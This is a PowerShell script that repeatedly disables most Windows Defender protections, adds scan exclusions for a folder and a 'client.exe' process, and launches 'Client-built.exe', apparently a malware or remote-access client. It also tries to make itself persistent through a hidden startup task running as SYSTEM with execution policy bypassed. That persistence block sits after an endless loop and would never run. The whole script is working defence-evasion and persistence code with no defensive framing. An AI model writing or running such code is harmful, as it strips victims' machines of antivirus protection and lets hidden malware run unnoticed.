# Define variables
$taskName = "DisableDefenderAndRunClient"
$scriptPath = "C:\Scripts\DisableDefenderAndRunClient.ps1"  # Ensure this script is saved at this location
$programPath = "C:\Scripts\Client-built.exe"                     # Replace with the path to your program folder
$programProcess = "client.exe"                              # Replace with the name of your program executable
$programFullPath = "C:\Scripts\Client-built.exe"      # Replace with the full path to your executable

# Function to disable all Windows Defender options, add specific exclusions, and run the program
function Disable-WindowsDefenderAndRunProgram {
    Write-Output "Disabling Windows Defender options, adding exclusions, and running client.exe..."

    # Disable Real-Time Protection
    Set-MpPreference -DisableRealtimeMonitoring $true

    # Disable Cloud-Delivered Protection
    Set-MpPreference -MAPSReporting Disabled

    # Disable Automatic Sample Submission
    Set-MpPreference -SubmitSamplesConsent NeverSend

    # Disable Behavior Monitoring
    Set-MpPreference -DisableBehaviorMonitoring $true

    # Disable Script Scanning
    Set-MpPreference -DisableScriptScanning $true

    # Disable Network Protection
    Set-MpPreference -DisableIntrusionPreventionSystem $true

    # Disable IOAV Protection (Protection against Internet Oriented Attacks)
    Set-MpPreference -DisableIOAVProtection $true

    # Disable Block at First Sight (Cloud protection feature)
    Set-MpPreference -DisableBlockAtFirstSeen $true

    # Disable Controlled Folder Access (Ransomware protection)
    Set-MpPreference -EnableControlledFolderAccess Disabled

    # Disable PUA Protection (Potentially Unwanted Applications)
    Set-MpPreference -PUAProtection Disabled

    # Add exclusion for your specific program folder and process
    Add-MpPreference -ExclusionPath $programPath
    Add-MpPreference -ExclusionProcess $programProcess

    # Run the client executable
    Start-Process -FilePath $programFullPath

    Write-Output "Windows Defender options disabled, exclusions added, and client.exe started."
}

# Infinite loop to run the disable function every 300 seconds
while ($true) {
    Disable-WindowsDefenderAndRunProgram
    Start-Sleep -Seconds 300  # Wait for 300 seconds (5 minutes)
}

# Save the current script and register it to run at startup
if (-Not (Test-Path $scriptPath)) {
    # Save the current script content to the specified path
    $currentScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path
    $currentScriptContent | Set-Content -Path $scriptPath
}

# Create the scheduled task action to run the script on startup
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`""

# Create the trigger to start the task at system startup
$trigger = New-ScheduledTaskTrigger -AtStartup

# Set the task principal to run with the highest privileges and hidden
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

# Register the scheduled task
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Description "Disables Windows Defender, adds exclusions, and runs client.exe at startup." -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable)

Write-Output "Scheduled task '$taskName' created successfully. The script will run hidden at startup."
